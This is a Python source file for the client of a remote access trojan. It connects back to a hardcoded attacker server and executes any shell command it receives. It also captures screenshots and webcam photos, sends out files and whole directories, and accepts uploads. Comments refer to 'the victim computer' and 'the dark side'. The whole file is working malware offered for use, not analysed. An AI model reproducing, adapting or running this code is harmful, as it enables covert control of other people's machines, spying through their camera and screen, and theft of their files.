import socket,pyautogui,cv2
import subprocess as sb
from os import chdir,system

#YOU HAVE TO CHANGE SERVER_IP and SERVER_PORT! It's necessary.
server_ip = "192.168.1.128"
server_port = 9999
s=None #Socket name
additional_data=None

def Main():
    connect_server(server_ip, server_port)

def connect_server(server_ip, server_port):
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # To prevent,
        # OSError: [Errno 98] Address already in use
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((server_ip, server_port))
        # print("Connection Successful")
        while True:
            cmd = str(s.recv(1024), "utf-8")
            # print(cmd)
            # Receive the command and convert to utf-8

            if (cmd[:2] == "cd"):
                chdir(cmd[3:])
                s.send(b"OK\n")
                # If command doesnt have output, we receive "OK".
                # Because server will wait for an output and this can break the server.

            elif (cmd == "exit"):
                s.close()
                exit()

            elif (cmd.split()[0] == "screenshot"):
                image_name=cmd.split()[1]
                screenshot(image_name)

            elif (cmd.split()[0] == "webcam"):
                name=cmd.split()[1]
                webcam_photo(name)

            elif (cmd.split()[0] == "download"):
                if(cmd.split()[1] == "-dir"):#If it's the directory
                    name=cmd.split()[2]
                    ssend_to_server(name)
                else:#If it's the file
                    name=cmd.split()[1]
                    send_to_server(name)
            elif (cmd.split()[0] == "upload"):
                if (cmd.split()[1] == "-dir"):
                    system("mkdir {}".format(cmd.split()[2]))
                    rreceive_data(cmd.split()[2])
                else:
                    name=cmd.split()[1]
                    receive_data(name)
            elif (len(cmd) > 0):  # If there is a command.
                p = sb.Popen(cmd, stdout=sb.PIPE, stderr=sb.STDOUT, shell=True)
                output = p.communicate()[0]

                if (len(output) == 0):
                    s.send(b"OK\n")  # You have to send with a byte object and convert it to str on the other side.
                    # If command doesnt have output, we receive "OK".
                    # Because server will wait for an output and this can break the server.
                else:
                    # print("Output:",output)
                    s.send(output)

        s.close()

    except Exception as e:
        print(e)
        s.close()

    finally:

        s.close()

def send_to_server(filename):#For files
    with open(filename,"rb") as file:
        for data in file:
            s.sendall(data)
        s.send(b"hmmn")

def ssend_to_server(directory):#For directories
    chdir(directory)
    p = sb.Popen(["ls"], stdout=sb.PIPE, stderr=sb.STDOUT)
    #List the files in the directory
    files = str(p.communicate()[0],"utf-8")
    #We converted it to str because they were b"".
    files = files.split("\n")
    # If you wanna understand, print the first "files".

    if ("" in files):
        files.remove("")
        #To prevent exception

    for file in files:
        with open(file,"rb") as f:
            for data in f:
                s.sendall(data)
            s.send(b"hmmn")

def receive_data(filename):
    #For files..
    with open(filename,"wb") as file:
        while True:
            data=s.recv(1024)
            if b"hmmn" in data:
                file.write(data[:-4])
                break
            file.write(data)

def rreceive_data(directory_name):#For directories
    global additional_data
    #Go into the directory
    chdir(directory_name)
    file_names=s.recv(1024)
    #Received the file names
    file_names = file_names.split(b"\n")
    # If you wanna understand, print the first "files".
    if (b"" in file_names):
        file_names.remove(b"")
        #To prevent exception

    #print(file_names)
    #Example:[b'audit.txt', b'server.py']

    for i in file_names:
        with open(i,"wb") as f:
            if (additional_data):
                f.write(additional_data)
                additional_data=None
            while True:
                data=s.recv(1024)
                if (b"hmmn" in data):
                    index=data.index(b"hmmn")
                    f.write(data[:index])
                    additional_data=data[index+4:]
                    break
                f.write(data)


def screenshot(image_name):
    #We take screenshot and it created in the current directory.
    #You have to download it from the victim computer
    #Use this command on the dark side..
    #download image_name.png
    pyautogui.screenshot("{}.png".format(image_name))

def webcam_photo(name):
    #Take photo using webcam
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    # cv2.imshow("test", frame)
    img_name = "{}.png".format(name)
    cv2.imwrite(img_name, frame)
    cam.release()
    cv2.destroyAllWindows()

if __name__ == '__main__':
    Main()
